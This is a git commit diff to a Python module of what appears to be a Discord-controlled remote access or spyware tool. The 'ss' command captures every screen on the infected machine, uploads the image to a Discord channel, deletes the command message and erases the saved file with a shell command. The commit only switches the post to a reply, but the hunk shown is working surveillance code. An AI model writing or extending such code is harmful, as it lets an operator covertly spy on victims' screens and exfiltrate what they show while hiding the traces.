63cc1a8a1487514bd6b7f5156f383eace917f21f
JuicyChann <nik.xeiladakis@gmail.com>
2023-11-20 15:31:30 +0200

    use ctx.reply

--- resources/modules/screenshot.py
+++ resources/modules/screenshot.py
@@ -4,9 +4,9 @@ from PIL import ImageGrab
 @client.command(name="ss")
 async def screenshot(ctx):
     if ctx.message.channel.id in channel_ids.values():
-        await ctx.message.delete()
         ImageGrab.grab(all_screens=True).save('ss.png')
-        await ctx.message.channel.send(embed=discord.Embed(title=current_time() + '`[On demand]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'ss.png'))
+        await ctx.reply(embed=discord.Embed(title=current_time() + '`[On demand]`', color=0x0084ff).set_image(url='attachment://ss.png'), file=discord.File(f'ss.png'), mention_author=False)
+        await ctx.message.delete()
         subprocess.run(f'del /s ss.png', shell=True)
     else:
         return
